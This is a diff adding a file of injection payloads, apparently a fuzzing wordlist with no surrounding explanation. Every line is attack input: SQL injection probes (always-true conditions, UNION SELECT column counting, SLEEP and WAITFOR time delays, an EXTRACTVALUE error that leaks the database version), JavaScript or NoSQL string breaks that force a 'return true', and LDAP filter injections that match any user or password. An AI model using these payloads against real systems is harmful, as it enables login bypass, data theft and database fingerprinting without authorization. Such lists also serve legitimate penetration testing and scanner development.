@@ -1,0 +1,27 @@
+'
+"
+1'
+1"
+1' OR '1'='1
+1" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+1' UNION SELECT null--
+1" UNION SELECT null--
+1' UNION SELECT null,null--
+1" UNION SELECT null,null--
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+1' WAITFOR DELAY '00:00:05'--
+1" WAITFOR DELAY '00:00:05'--
+1' AND 1=1--
+1' AND 1=2--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+'; return true; var x='
+'; return true; //
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+' or '1'='1
+' or 1=1 or ''='
